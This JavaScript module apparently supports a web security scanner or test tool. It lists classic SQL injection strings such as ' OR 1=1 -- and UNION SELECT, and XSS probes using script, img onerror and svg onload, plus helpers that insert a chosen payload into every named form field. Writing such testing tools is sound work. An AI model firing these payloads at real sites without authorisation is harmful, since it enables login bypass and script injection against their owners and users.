const payloadsByType = {
  sql: ["' OR 1=1 --", "' OR 'a'='a", "admin' --", "' UNION SELECT NULL --"],
  xss: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '" onmouseover="alert(1)"',
    '<svg/onload=alert(1)>'
  ]
};

function getPayloadTypes() {
  return Object.keys(payloadsByType);
}

function getPayloads(type) {
  if (!type) {
    return payloadsByType;
  }

  const normalizedType = String(type).toLowerCase();
  if (!payloadsByType[normalizedType]) {
    throw new Error(`Unsupported payload type: ${type}`);
  }

  return payloadsByType[normalizedType];
}

function pickPayload(type, index = 0) {
  const list = getPayloads(type);
  if (!Array.isArray(list) || list.length === 0) {
    throw new Error(`No payloads available for type: ${type}`);
  }

  const safeIndex = Number.isInteger(index) ? index : Number.parseInt(index, 10);
  if (Number.isNaN(safeIndex) || safeIndex < 0 || safeIndex >= list.length) {
    throw new Error(`Payload index out of range. Allowed range: 0-${list.length - 1}`);
  }

  return list[safeIndex];
}

function injectPayload(inputs, payload) {
  if (!Array.isArray(inputs) || inputs.length === 0) {
    throw new Error('Inputs must be a non-empty array');
  }

  const data = {};
  for (const input of inputs) {
    if (typeof input === 'string' && input.trim()) {
      data[input] = payload;
      continue;
    }

    if (input && typeof input.name === 'string' && input.name.trim()) {
      data[input.name] = payload;
      continue;
    }
  }

  if (Object.keys(data).length === 0) {
    throw new Error('No valid input names found for payload injection');
  }

  return data;
}

module.exports = {
  getPayloadTypes,
  getPayloads,
  pickPayload,
  injectPayload
};
